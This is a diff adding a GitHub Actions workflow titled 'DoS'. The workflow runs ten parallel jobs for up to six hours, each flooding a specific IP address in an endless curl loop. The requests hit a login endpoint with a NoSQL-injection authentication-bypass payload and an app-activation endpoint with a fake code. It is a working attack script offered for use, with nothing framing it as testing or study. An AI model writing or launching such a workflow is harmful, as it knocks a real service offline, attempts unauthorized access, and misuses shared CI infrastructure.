@@ -1,0 +1,25 @@
+name: DoS
+on: [push, workflow_dispatch]
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      max-parallel: 10
+      matrix:
+        job_id: [1,2,3,4,5,6,7,8,9,10]
+    steps:
+    - name: Attack Job ${{ matrix.job_id }}
+      run: |
+        for i in {1..100}; do
+          while true; do
+            curl -s -o /dev/null -X POST http://64.81.114.52:3100/api/login \
+              -H "Content-Type: application/json" \
+              -d '{"username":{"$ne":""},"password":{"$ne":""}}' &
+            curl -s -o /dev/null -X POST http://64.81.114.52:3100/api/app/activate \
+              -H "Content-Type: application/json" \
+              -d '{"code":"A1B2C3D4E5F6G7H8","installId":"a","deviceName":"b"}' &
+            sleep 0.05
+          done
+        done
+        sleep 3500
